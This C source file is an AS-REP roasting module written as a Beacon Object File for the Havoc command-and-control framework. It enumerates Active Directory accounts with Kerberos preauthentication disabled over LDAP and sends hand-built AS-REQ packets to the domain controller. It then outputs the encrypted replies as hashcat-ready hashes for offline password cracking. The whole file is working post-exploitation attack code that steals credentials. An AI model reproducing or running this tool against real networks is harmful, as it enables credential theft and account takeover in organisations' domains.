#include <winsock2.h>
#include <windows.h>
#include <winldap.h>
#include <stdio.h>
#include <stdarg.h>
#include "beacon.h"
#include "bofdefs.h"

/*
 * AS-REP Roasting BOF for Havoc C2
 *
 * Enumerates accounts with DONT_REQUIRE_PREAUTH via LDAP, sends a raw
 * AS-REQ (no preauthentication) to the KDC over TCP/88, parses the
 * AS-REP, and emits hashcat-compatible hashes.
 *
 * Hash format — hashcat mode 18200 (RC4 / etype 23):
 *   $krb5asrep$23$user@REALM:<16-byte-checksum-hex>$<remaining-hex>
 *
 * Also supports AES etypes (17/18) when the KDC returns them.
 */

/* ================================================================== */
/*  Output buffering — single BeaconOutput at the end (like kerberoast) */
/* ================================================================== */

#define OUTBUF_SIZE 65536

static char* g_out = (char*)1;
static int   g_len = 1;

static void out_flush(void)
{
    if (g_out && g_out != (char*)1 && g_len > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_out, g_len);
    g_len = 0;
}

static void out_printf(const char* fmt, ...)
{
    if (!g_out || g_out == (char*)1) return;
    va_list ap;
    char tmp[2048];
    va_start(ap, fmt);
    int n = MSVCRT$vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n <= 0) return;
    if (n >= (int)sizeof(tmp)) n = (int)sizeof(tmp) - 1;
    if (g_len + n >= OUTBUF_SIZE) out_flush();
    MSVCRT$memcpy(g_out + g_len, tmp, (size_t)n);
    g_len += n;
    g_out[g_len] = '\0';
}

/* ================================================================== */
/*  Minimal DER encoder — builds ASN.1 structures bottom-up            */
/* ================================================================== */

typedef struct { BYTE* d; int len; int cap; } DerBuf;

static void db_init(DerBuf* b, int cap)
{
    b->d = (BYTE*)MSVCRT$calloc((size_t)cap, 1);
    b->len = 0;
    b->cap = cap;
}

static void db_byte(DerBuf* b, BYTE v)
{
    if (b->d && b->len < b->cap) b->d[b->len++] = v;
}

static void db_bytes(DerBuf* b, const BYTE* s, int n)
{
    if (b->d && b->len + n <= b->cap) {
        MSVCRT$memcpy(b->d + b->len, s, (size_t)n);
        b->len += n;
    }
}

static void db_free(DerBuf* b)
{
    if (b->d) MSVCRT$free(b->d);
    b->d = NULL;
    b->len = b->cap = 0;
}

static void db_len(DerBuf* b, int len)
{
    if (len < 0x80)       { db_byte(b, (BYTE)len); }
    else if (len < 0x100) { db_byte(b, 0x81); db_byte(b, (BYTE)len); }
    else                  { db_byte(b, 0x82); db_byte(b, (BYTE)(len >> 8)); db_byte(b, (BYTE)len); }
}

static void db_tlv(DerBuf* b, BYTE tag, const BYTE* c, int cl)
{
    db_byte(b, tag);
    db_len(b, cl);
    if (cl > 0) db_bytes(b, c, cl);
}

static void db_integer(DerBuf* b, int val)
{
    BYTE tmp[5];
    int n = 0;
    if (val >= 0 && val < 0x80) {
        tmp[0] = (BYTE)val; n = 1;
    } else if (val >= 0x80 && val < 0x100) {
        tmp[0] = 0; tmp[1] = (BYTE)val; n = 2;
    } else if (val >= 0x100 && val < 0x8000) {
        tmp[0] = (BYTE)(val >> 8); tmp[1] = (BYTE)val; n = 2;
    } else if (val >= 0x8000 && val < 0x10000) {
        tmp[0] = 0; tmp[1] = (BYTE)(val >> 8); tmp[2] = (BYTE)val; n = 3;
    } else {
        BYTE raw[4] = { (BYTE)(val >> 24), (BYTE)(val >> 16), (BYTE)(val >> 8), (BYTE)val };
        int s = 0;
        while (s < 3 && raw[s] == 0) s++;
        if (raw[s] & 0x80) tmp[n++] = 0;
        for (int i = s; i < 4; i++) tmp[n++] = raw[i];
    }
    db_tlv(b, 0x02, tmp, n);
}

static void db_genstring(DerBuf* b, const char* s)
{
    db_tlv(b, 0x1b, (const BYTE*)s, (int)MSVCRT$strlen(s));
}

static void db_gentime(DerBuf* b, const char* s)
{
    db_tlv(b, 0x18, (const BYTE*)s, (int)MSVCRT$strlen(s));
}

static void db_bitstring(DerBuf* b, const BYTE* bits, int nb)
{
    db_byte(b, 0x03);
    db_len(b, nb + 1);
    db_byte(b, 0x00);
    db_bytes(b, bits, nb);
}

#define DB_WRAP_SEQ(b, i)      db_tlv(b, 0x30, (i)->d, (i)->len)
#define DB_WRAP_CTX(b, n, i)   db_tlv(b, (BYTE)(0xa0 | (n)), (i)->d, (i)->len)
#define DB_WRAP_APP(b, n, i)   db_tlv(b, (BYTE)(0x60 | (n)), (i)->d, (i)->len)

/* ================================================================== */
/*  Build an AS-REQ without preauthentication                          */
/* ================================================================== */

static int build_asreq(const char* user, const char* realm, BYTE** out, int* outlen)
{
    DerBuf body, t1, t2, t3;

    /* -- KDC-REQ-BODY -- */
    db_init(&body, 1024);

    /* [0] kdc-options: forwardable | renewable | canonicalize | renewable-ok */
    db_init(&t1, 16);
    { BYTE opts[4] = {0x40, 0x81, 0x00, 0x10}; db_bitstring(&t1, opts, 4); }
    DB_WRAP_CTX(&body, 0, &t1); db_free(&t1);

    /* [1] cname: NT-PRINCIPAL (1) */
    db_init(&t1, 256);
    db_init(&t2, 16);  db_integer(&t2, 1);     DB_WRAP_CTX(&t1, 0, &t2); db_free(&t2);
    db_init(&t2, 128);  db_genstring(&t2, user);
    db_init(&t3, 136);  DB_WRAP_SEQ(&t3, &t2);  DB_WRAP_CTX(&t1, 1, &t3);
    db_free(&t2); db_free(&t3);
    db_init(&t2, 264);  DB_WRAP_SEQ(&t2, &t1);  DB_WRAP_CTX(&body, 1, &t2);
    db_free(&t1); db_free(&t2);

    /* [2] realm */
    db_init(&t1, 128); db_genstring(&t1, realm); DB_WRAP_CTX(&body, 2, &t1); db_free(&t1);

    /* [3] sname: NT-SRV-INST (2), krbtgt/REALM */
    db_init(&t1, 256);
    db_init(&t2, 16);  db_integer(&t2, 2);     DB_WRAP_CTX(&t1, 0, &t2); db_free(&t2);
    db_init(&t2, 256);  db_genstring(&t2, "krbtgt"); db_genstring(&t2, realm);
    db_init(&t3, 260);  DB_WRAP_SEQ(&t3, &t2);  DB_WRAP_CTX(&t1, 1, &t3);
    db_free(&t2); db_free(&t3);
    db_init(&t2, 280);  DB_WRAP_SEQ(&t2, &t1);  DB_WRAP_CTX(&body, 3, &t2);
    db_free(&t1); db_free(&t2);

    /* [5] till — far future */
    db_init(&t1, 32); db_gentime(&t1, "20370913080510Z"); DB_WRAP_CTX(&body, 5, &t1); db_free(&t1);

    /* [7] nonce */
    db_init(&t1, 16); db_integer(&t1, (int)(KERNEL32$GetTickCount() & 0x7FFFFFFF));
    DB_WRAP_CTX(&body, 7, &t1); db_free(&t1);

    /* [8] etype: prefer RC4(23), then AES128(17), AES256(18) */
    db_init(&t1, 32); db_integer(&t1, 23); db_integer(&t1, 17); db_integer(&t1, 18);
    db_init(&t2, 40); DB_WRAP_SEQ(&t2, &t1); DB_WRAP_CTX(&body, 8, &t2);
    db_free(&t1); db_free(&t2);

    /* Wrap body in SEQUENCE */
    db_init(&t1, 1024); DB_WRAP_SEQ(&t1, &body); db_free(&body);

    /* -- KDC-REQ envelope -- */
    db_init(&body, 1024);
    /* [1] pvno = 5 */
    db_init(&t2, 16); db_integer(&t2, 5);  DB_WRAP_CTX(&body, 1, &t2); db_free(&t2);
    /* [2] msg-type = 10 (AS-REQ) */
    db_init(&t2, 16); db_integer(&t2, 10); DB_WRAP_CTX(&body, 2, &t2); db_free(&t2);
    /* [4] req-body */
    DB_WRAP_CTX(&body, 4, &t1); db_free(&t1);

    /* SEQUENCE → APPLICATION 10 */
    db_init(&t1, 1024); DB_WRAP_SEQ(&t1, &body); db_free(&body);
    db_init(&body, 1024); DB_WRAP_APP(&body, 10, &t1); db_free(&t1);

    *out    = body.d;
    *outlen = body.len;
    return 1;
}

/* ================================================================== */
/*  Minimal DER parser — navigate AS-REP to extract enc-part           */
/* ================================================================== */

static int der_read_tl(const BYTE* buf, int blen, int* pos, BYTE* tag)
{
    if (*pos >= blen) return -1;
    *tag = buf[(*pos)++];
    if (*pos >= blen) return -1;
    BYTE b = buf[(*pos)++];
    if (b < 0x80) return (int)b;
    if (b == 0x81) { if (*pos >= blen) return -1; return (int)buf[(*pos)++]; }
    if (b == 0x82) { if (*pos + 1 >= blen) return -1; int l = (buf[*pos] << 8) | buf[*pos + 1]; *pos += 2; return l; }
    if (b == 0x83) { if (*pos + 2 >= blen) return -1; int l = (buf[*pos] << 16) | (buf[*pos+1] << 8) | buf[*pos+2]; *pos += 3; return l; }
    return -1;
}

static int der_find_ctx(const BYTE* buf, int blen, int start, int slen, int n, int* cpos)
{
    int pos = start, end = start + slen;
    BYTE want = (BYTE)(0xa0 | n);
    while (pos < end) {
        BYTE tag;
        int len = der_read_tl(buf, blen, &pos, &tag);
        if (len < 0) return -1;
        if (tag == want) { *cpos = pos; return len; }
        pos += len;
    }
    return -1;
}

static int der_read_int(const BYTE* buf, int blen, int pos, int* val)
{
    BYTE tag;
    int len = der_read_tl(buf, blen, &pos, &tag);
    if (len < 0 || tag != 0x02) return -1;
    int v = 0;
    for (int i = 0; i < len && i < 4; i++)
        v = (v << 8) | buf[pos + i];
    *val = v;
    return 0;
}

/*
 * Parse an AS-REP (or KRB-ERROR) response.
 * Returns: 0 = success (etype/cipher populated),
 *          1 = KRB-ERROR (error_code set),
 *         -1 = parse failure
 */
static int parse_asrep(const BYTE* buf, int blen,
                       int* etype, const BYTE** cipher, int* cipher_len,
                       int* error_code)
{
    int pos = 0;
    BYTE tag;
    int len;

    /* APPLICATION tag */
    len = der_read_tl(buf, blen, &pos, &tag);
    if (len < 0) return -1;

    if (tag == 0x7e) {
        /* APPLICATION 30 = KRB-ERROR */
        len = der_read_tl(buf, blen, &pos, &tag);
        if (len < 0 || tag != 0x30) return -1;
        int cpos;
        int clen = der_find_ctx(buf, blen, pos, len, 6, &cpos);
        if (clen > 0) der_read_int(buf, blen, cpos, error_code);
        return 1;
    }

    if (tag != 0x6b) return -1; /* APPLICATION 11 = AS-REP */

    /* SEQUENCE */
    len = der_read_tl(buf, blen, &pos, &tag);
    if (len < 0 || tag != 0x30) return -1;
    int seq_start = pos;
    int seq_len   = len;

    /* Find enc-part [6] */
    int enc_pos;
    int enc_len = der_find_ctx(buf, blen, seq_start, seq_len, 6, &enc_pos);
    if (enc_len < 0) return -1;

    /* EncryptedData SEQUENCE */
    pos = enc_pos;
    len = der_read_tl(buf, blen, &pos, &tag);
    if (len < 0 || tag != 0x30) return -1;
    int ed_start = pos;
    int ed_len   = len;

    /* [0] etype */
    int et_pos;
    int et_len = der_find_ctx(buf, blen, ed_start, ed_len, 0, &et_pos);
    if (et_len < 0) return -1;
    if (der_read_int(buf, blen, et_pos, etype) < 0) return -1;

    /* [2] cipher — OCTET STRING */
    int ci_pos;
    int ci_len = der_find_ctx(buf, blen, ed_start, ed_len, 2, &ci_pos);
    if (ci_len < 0) return -1;
    pos = ci_pos;
    len = der_read_tl(buf, blen, &pos, &tag);
    if (len < 0 || tag != 0x04) return -1;
    *cipher     = buf + pos;
    *cipher_len = len;
    return 0;
}

/* ================================================================== */
/*  Network — raw TCP exchange with KDC on port 88                     */
/* ================================================================== */

static unsigned long parse_ipv4(const char* s)
{
    unsigned long ip = 0;
    int i;
    for (i = 0; i < 4; i++) {
        int octet = 0;
        while (*s >= '0' && *s <= '9') { octet = octet * 10 + (*s - '0'); s++; }
        ip |= ((unsigned long)(octet & 0xff)) << (i * 8);
        if (*s == '.') s++;
    }
    return ip;
}

static int krb_exchange(const char* dc_ip, const BYTE* asreq, int asreq_len,
                        BYTE** resp, int* resp_len)
{
    SOCKET s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return -1;

    struct sockaddr_in addr;
    MSVCRT$memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = (unsigned short)(((88 >> 8) & 0xff) | ((88 & 0xff) << 8));
    addr.sin_addr.s_addr = parse_ipv4(dc_ip);

    if (WS2_32$connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        WS2_32$closesocket(s);
        return -1;
    }

    /* TCP Kerberos framing: 4-byte big-endian length prefix */
    BYTE frame[4];
    frame[0] = (BYTE)(asreq_len >> 24);
    frame[1] = (BYTE)(asreq_len >> 16);
    frame[2] = (BYTE)(asreq_len >> 8);
    frame[3] = (BYTE)asreq_len;
    WS2_32$send(s, (const char*)frame, 4, 0);
    WS2_32$send(s, (const char*)asreq, asreq_len, 0);

    /* Receive framed response */
    BYTE rframe[4];
    int rcvd = 0;
    while (rcvd < 4) {
        int n = WS2_32$recv(s, (char*)rframe + rcvd, 4 - rcvd, 0);
        if (n <= 0) { WS2_32$closesocket(s); return -1; }
        rcvd += n;
    }
    int rlen = ((int)rframe[0] << 24) | ((int)rframe[1] << 16) |
               ((int)rframe[2] << 8)  |  (int)rframe[3];
    if (rlen <= 0 || rlen > 65536) { WS2_32$closesocket(s); return -1; }

    BYTE* rbuf = (BYTE*)MSVCRT$calloc((size_t)rlen, 1);
    if (!rbuf) { WS2_32$closesocket(s); return -1; }
    rcvd = 0;
    while (rcvd < rlen) {
        int n = WS2_32$recv(s, (char*)rbuf + rcvd, rlen - rcvd, 0);
        if (n <= 0) { MSVCRT$free(rbuf); WS2_32$closesocket(s); return -1; }
        rcvd += n;
    }

    WS2_32$closesocket(s);
    *resp     = rbuf;
    *resp_len = rlen;
    return 0;
}

/* ================================================================== */
/*  LDAP helpers                                                       */
/* ================================================================== */

static LDAP* ldap_connect_dc(void)
{
    LDAP* ld = WLDAP32$ldap_init(NULL, 389);
    if (!ld) return NULL;
    ULONG ver = LDAP_VERSION3;
    WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &ver);
    if (WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        WLDAP32$ldap_unbind(ld);
        return NULL;
    }
    return ld;
}

static char* ldap_get_base_dn(LDAP* ld)
{
    LDAPMessage* res = NULL;
    PCHAR attrs[2] = { "defaultNamingContext", NULL };
    if (WLDAP32$ldap_search_s(ld, NULL, LDAP_SCOPE_BASE, "(objectclass=*)",
                               attrs, 0, &res) != LDAP_SUCCESS || !res)
        return NULL;
    char* dn = NULL;
    LDAPMessage* e = WLDAP32$ldap_first_entry(ld, res);
    if (e) {
        PCHAR* vals = WLDAP32$ldap_get_values(ld, e, "defaultNamingContext");
        if (vals && vals[0]) {
            int l = (int)MSVCRT$strlen(vals[0]);
            dn = (char*)MSVCRT$calloc((size_t)(l + 1), 1);
            if (dn) MSVCRT$memcpy(dn, vals[0], (size_t)l);
        }
        if (vals) WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return dn;
}

/* ================================================================== */
/*  Utility                                                            */
/* ================================================================== */

static void str_upper(char* s)
{
    for (; *s; s++)
        if (*s >= 'a' && *s <= 'z') *s -= 32;
}

/* "DC=corp,DC=local" → "CORP.LOCAL" */
static char* dn_to_realm(const char* dn)
{
    char* realm = (char*)MSVCRT$calloc(MSVCRT$strlen(dn) + 1, 1);
    if (!realm) return NULL;
    int ri = 0;
    const char* p = dn;
    while (*p) {
        if ((p[0] == 'D' || p[0] == 'd') &&
            (p[1] == 'C' || p[1] == 'c') && p[2] == '=') {
            if (ri > 0) realm[ri++] = '.';
            p += 3;
            while (*p && *p != ',') { realm[ri++] = *p; p++; }
            if (*p == ',') p++;
        } else {
            while (*p && *p != ',') p++;
            if (*p == ',') p++;
        }
    }
    realm[ri] = '\0';
    str_upper(realm);
    return realm;
}

typedef struct { char ip[64]; char domain[256]; } DC_INFO;

static int get_dc_info(DC_INFO* info)
{
    ASREP_DC_INFOA* pDCI = NULL;
    /* DS_DIRECTORY_SERVICE_REQUIRED | DS_IP_REQUIRED | DS_RETURN_DNS_NAME */
    DWORD rc = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL,
                                      0x00000010 | 0x00000200 | 0x40000000,
                                      &pDCI);
    if (rc != 0 || !pDCI) return -1;

    const char* addr = pDCI->DomainControllerAddress;
    while (*addr == '\\') addr++;
    int len = (int)MSVCRT$strlen(addr);
    if (len >= 64) len = 63;
    MSVCRT$memcpy(info->ip, addr, (size_t)len);
    info->ip[len] = '\0';

    len = (int)MSVCRT$strlen(pDCI->DomainName);
    if (len >= 256) len = 255;
    MSVCRT$memcpy(info->domain, pDCI->DomainName, (size_t)len);
    info->domain[len] = '\0';
    str_upper(info->domain);

    NETAPI32$NetApiBufferFree(pDCI);
    return 0;
}

/* ================================================================== */
/*  Roast one user                                                     */
/* ================================================================== */

static void roast_user(const char* dc_ip, const char* username, const char* realm)
{
    BYTE* asreq = NULL;
    int asreq_len = 0;
    if (!build_asreq(username, realm, &asreq, &asreq_len)) {
        out_printf("[!] %s: failed to build AS-REQ\n", username);
        return;
    }

    BYTE* resp = NULL;
    int resp_len = 0;
    if (krb_exchange(dc_ip, asreq, asreq_len, &resp, &resp_len) < 0) {
        out_printf("[!] %s: failed to connect to KDC %s:88\n", username, dc_ip);
        MSVCRT$free(asreq);
        return;
    }
    MSVCRT$free(asreq);

    int etype = 0, error_code = 0, cipher_len = 0;
    const BYTE* cipher = NULL;

    int rc = parse_asrep(resp, resp_len, &etype, &cipher, &cipher_len, &error_code);
    if (rc == 1) {
        out_printf("[!] %s: KRB-ERROR %d", username, error_code);
        if (error_code == 25)
            out_printf(" (KDC_ERR_PREAUTH_REQUIRED)");
        else if (error_code == 6)
            out_printf(" (KDC_ERR_C_PRINCIPAL_UNKNOWN)");
        else if (error_code == 12)
            out_printf(" (KDC_ERR_POLICY)");
        out_printf("\n");
        MSVCRT$free(resp);
        return;
    }
    if (rc < 0 || !cipher || cipher_len < 16) {
        out_printf("[!] %s: failed to parse AS-REP\n", username);
        MSVCRT$free(resp);
        return;
    }

    if (etype == 23) {
        /* hashcat mode 18200: $krb5asrep$23$user@REALM:<16B>$<rest> */
        out_printf("$krb5asrep$23$%s@%s:", username, realm);
    } else if (etype == 17 || etype == 18) {
        /* hashcat modes 19600 (etype 17) / 19700 (etype 18) */
        out_printf("$krb5asrep$%d$%s$%s$", etype, username, realm);
    } else {
        out_printf("[!] %s: unsupported etype %d\n", username, etype);
        MSVCRT$free(resp);
        return;
    }

    int i;
    for (i = 0; i < cipher_len; i++) {
        if (i == 16) out_printf("$");
        out_printf("%.2x", cipher[i]);
    }
    out_printf("\n");

    MSVCRT$free(resp);
}

/* ================================================================== */
/*  Main entry                                                         */
/* ================================================================== */

static void execute_asreproast(const char* target_user)
{
    g_out = (char*)MSVCRT$calloc(OUTBUF_SIZE, 1);
    g_len = 0;
    if (!g_out) { g_out = (char*)1; g_len = 1; return; }

    /* Initialize Winsock */
    WSADATA wsa;
    MSVCRT$memset(&wsa, 0, sizeof(wsa));
    if (WS2_32$WSAStartup(0x0202, &wsa) != 0) {
        out_printf("[!] WSAStartup failed\n");
        goto done;
    }

    /* Get DC address + domain */
    DC_INFO dc;
    MSVCRT$memset(&dc, 0, sizeof(dc));
    if (get_dc_info(&dc) < 0) {
        out_printf("[!] Failed to get domain controller info (not domain-joined?)\n");
        goto cleanup_wsa;
    }

    out_printf("[*] DC: %s  Realm: %s\n", dc.ip, dc.domain);

    if (target_user[0] != '\0') {
        roast_user(dc.ip, target_user, dc.domain);
    } else {
        /* LDAP: enumerate accounts with DONT_REQUIRE_PREAUTH */
        LDAP* ld = ldap_connect_dc();
        if (!ld) {
            out_printf("[!] LDAP connect/bind failed\n");
            goto cleanup_wsa;
        }
        char* baseDn = ldap_get_base_dn(ld);
        if (!baseDn) {
            out_printf("[!] Could not read defaultNamingContext\n");
            WLDAP32$ldap_unbind(ld);
            goto cleanup_wsa;
        }

        char* realm = dn_to_realm(baseDn);
        if (!realm) {
            out_printf("[!] Could not derive realm from baseDN\n");
            MSVCRT$free(baseDn);
            WLDAP32$ldap_unbind(ld);
            goto cleanup_wsa;
        }

        const char* filter =
            "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
            "(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
        PCHAR attrs[2] = { "sAMAccountName", NULL };
        LDAPMessage* res = NULL;

        out_printf("[*] Searching for DONT_REQUIRE_PREAUTH accounts...\n");

        ULONG rc = WLDAP32$ldap_search_s(ld, baseDn, LDAP_SCOPE_SUBTREE,
                                          (PSTR)filter, attrs, 0, &res);
        if (rc != LDAP_SUCCESS || !res) {
            out_printf("[!] LDAP search failed: 0x%lx\n", (unsigned long)rc);
            if (res) WLDAP32$ldap_msgfree(res);
            MSVCRT$free(realm);
            MSVCRT$free(baseDn);
            WLDAP32$ldap_unbind(ld);
            goto cleanup_wsa;
        }

        int count = 0;
        LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, res);
        while (entry) {
            PCHAR* sam = WLDAP32$ldap_get_values(ld, entry, "sAMAccountName");
            if (sam && sam[0]) {
                out_printf("\n");
                roast_user(dc.ip, sam[0], dc.domain);
                count++;
            }
            if (sam) WLDAP32$ldap_value_free(sam);
            entry = WLDAP32$ldap_next_entry(ld, entry);
        }

        WLDAP32$ldap_msgfree(res);
        MSVCRT$free(realm);
        MSVCRT$free(baseDn);
        WLDAP32$ldap_unbind(ld);

        if (count == 0)
            out_printf("[*] No AS-REP roastable accounts found\n");
        else
            out_printf("\n[*] AS-REP roasted %d account(s)\n", count);
    }

cleanup_wsa:
    WS2_32$WSACleanup();
done:
    out_flush();
    if (g_out && g_out != (char*)1) MSVCRT$free(g_out);
    g_out = (char*)1;
    g_len = 1;
}

#ifdef BOF

void go(char* args, int length)
{
    datap parser;
    BeaconDataParse(&parser, args, length);
    char* target = BeaconDataExtract(&parser, NULL);
    if (target == NULL) target = "";
    execute_asreproast(target);
}

#else

int main(int argc, char* argv[])
{
    char* target = "";
    if (argc >= 2) target = argv[1];
    execute_asreproast(target);
    return 0;
}

#endif
